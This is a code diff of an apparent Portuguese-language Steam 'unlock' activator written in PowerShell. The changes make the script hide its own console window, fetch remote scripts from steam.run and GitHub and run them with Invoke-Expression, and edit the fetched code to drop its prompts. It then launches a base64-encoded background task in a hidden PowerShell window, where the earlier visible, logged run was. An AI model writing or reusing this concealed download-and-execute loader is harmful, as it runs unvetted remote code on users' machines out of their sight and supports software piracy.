@@ -1,4 +1,7 @@
-# Não ocultamos a janela inicial para garantir que não há conflitos de interface
+# 1. Oculta a janela inicial (Console)
+$showWindow = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
+$type = Add-Type -MemberDefinition $showWindow -Name "Win32ShowWindow" -Namespace "Win32" -PassThru
+$type::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 Add-Type -AssemblyName Microsoft.VisualBasic, System.Windows.Forms
@@ -15,46 +18,70 @@ try {
     $auth = Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/json" -UserAgent "Mozilla/5.0"
 
     if ($auth.status -eq "authorized") {
-        
-        [System.Windows.Forms.MessageBox]::Show("STEAM DESBLOQUEADA ATIVADA PERMANENTEMENTE`n(Qualquer erro ative novamente com a mesma chave)`n`nUma janela do console abrirá para acompanhar a instalação.", "Sucesso")
 
-        # Usando @' para passar o comando de forma segura
-        $bgTask = @'
-        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-        
-        # Define o caminho do log
-        $logPath = "$env:TEMP\SteamAtivador_Log.txt"
-        Start-Transcript -Path $logPath -Force
-        
-        try {
-            Write-Host "Baixando script original do GitHub..." -ForegroundColor Cyan
-            $rawScript = Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/VenezzaX/SteamFunDependencies/refs/heads/main/steampro.ps1'
-            
-            Write-Host "Executando instalação..." -ForegroundColor Green
-            # Executa o script original na íntegra.
-            # Como a janela está visível, os comandos [Console]::ReadKey e Host.UI funcionarão perfeitamente.
-            Invoke-Expression $rawScript
+        [System.Windows.Forms.MessageBox]::Show(
+            "STEAM DESBLOQUEADA ATIVADA PERMANENTEMENTE`n(Qualquer erro ative novamente com a mesma chave)`n`nO download iniciou e pode levar cerca de 1 a 2 minutos. Aguarde.",
+            "Sucesso"
+        )
 
-            Write-Host "Baixando aviso final..." -ForegroundColor Cyan
-            $wUrl = "https://raw.githubusercontent.com/RicoSteam/SteamMethod/refs/heads/main/warning.txt"
-            $path = "$env:TEMP\warning.txt"
-            (New-Object System.Net.WebClient).DownloadFile($wUrl, $path)
-            Start-Process notepad.exe $path
-            
-        } catch {
-            Write-Host "ERRO FATAL: $_" -ForegroundColor Red
-        } finally {
-            Stop-Transcript
-            Write-Host "`nInstalação concluída. Pressione ENTER para fechar a janela..." -ForegroundColor Yellow
-            Read-Host
+        # ====== RESOLVER STEAMTOOLS (ANTES DO STEAMFUN) ======
+        $steam = (Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam").InstallPath
+        $steamtoolsDll = Join-Path $steam "dwmapi.dll"
+
+        function Test-Steamtools {
+            return (Test-Path $steamtoolsDll)
         }
+
+        function Install-SteamtoolsAuto {
+            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+            $raw = Invoke-RestMethod "https://steam.run"
+
+            $keptLines = @()
+            foreach ($line in $raw -split "`n") {
+                $conditions = @(
+                    ($line -imatch "Start-Process" -and $line -imatch "steam"),
+                    ($line -imatch "steam\.exe"),
+                    ($line -imatch "Start-Sleep" -or $line -imatch "Write-Host"),
+                    ($line -imatch "cls" -or $line -imatch "exit"),
+                    ($line -imatch "Stop-Process" -and -not ($line -imatch "Get-Process"))
+                )
+                if (-not ($conditions -contains $true)) {
+                    $keptLines += $line
+                }
+            }
+
+            $s = $keptLines -join "`n"
+            $s = $s.Replace('[void][System.Console]::ReadKey($true)', 'Start-Sleep -Seconds 2')
+            Invoke-Expression $s
+        }
+
+        if (-not (Test-Steamtools)) {
+            Install-SteamtoolsAuto
+        }
+
+        # ====== BG TASK: STEAMFUN + AVISO ======
+        $bgTask = @'
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+try {
+    $s = Invoke-RestMethod -Uri "https://raw.githubusercontent.com/VenezzaX/SteamFunDependencies/refs/heads/main/steampro.ps1"
+
+    $s = $s.Replace("[void][System.Console]::ReadKey($true)", "Start-Sleep -Seconds 2")
+    $s = $s.Replace("[Console]::KeyAvailable", "$false")
+
+    Invoke-Expression $s
+
+    $wUrl = "https://raw.githubusercontent.com/RicoSteam/SteamMethod/refs/heads/main/warning.txt"
+    $path = "$env:TEMP\warning.txt"
+    (New-Object System.Net.WebClient).DownloadFile($wUrl, $path)
+    Start-Process notepad.exe $path
+
+} catch {
+}
 '@
 
         $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($bgTask))
-        
-        # Dispara o processo em modo Normal (Visível) para o utilizador poder interagir e ver os logs
-        Start-Process powershell.exe -ArgumentList "-NoProfile", "-ExecutionPolicy Bypass", "-WindowStyle Normal", "-EncodedCommand", $encoded
-        
+        Start-Process powershell.exe -ArgumentList "-NoProfile", "-WindowStyle Hidden", "-EncodedCommand", $encoded -WindowStyle Hidden
         exit
 
     } else {
